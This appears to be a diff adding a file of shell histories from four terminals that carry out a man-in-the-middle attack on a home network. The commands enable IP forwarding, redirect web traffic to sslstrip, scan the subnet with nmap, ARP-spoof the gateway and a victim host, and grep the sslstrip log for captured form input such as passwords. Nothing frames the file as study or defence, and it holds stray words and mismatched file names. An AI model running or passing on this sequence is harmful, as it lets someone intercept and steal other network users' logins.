@@ -1,0 +1,41 @@
+terminal_one)
+    1  cd Desktop/
+    2  echo  > /proc/sys/net/ipv4/ip_forward
+    3  echo 1 > /proc/sys/net/ipv4/ip_forward
+    4  cat  /proc/sys/net/ipv4/ip_forward
+    5  iptables -t nat -L PREROUTING
+    6  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+    7  iptables -t nat -L PREROUTING
+    8  ifconfig
+    9  ifconfig wlan0
+   10  route
+   11  nmap 192.168.0.1/24
+   12  nmap 192.168.0.100-200 -vv
+   13  nmap 192.168.0.100-110 -Pn -vv
+   14  nmap 192.168.0.100-110 -O -vv
+   15  arp
+   16  arp -a
+   17  iptables -L INPUT
+   18  iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+   19  iptables -L INPUT
+   20  arpspoof -i wlan0 -t 192.168.0.1 -r 192.168.0.108
+   21  history > terminal_two.txt
+
+terminal two)
+    1  arpspoof -i wlan0 -t 192.168.0.108 -r 192.168.0.1
+    2  history > terminal_one.txt
+
+terminal tree)
+    1  sslstrip -l 8080
+    2  tail -f sslstrip.log
+    3  cat sslstrip.log 
+    4  history > terminal_tree.txt
+
+terminal four)
+    1  tail -f sslstrip.log
+    2  history > terminal.four.txt
+
+	cardaluhamar 
+		 cat sslstrip.log | grep -a input
+
+
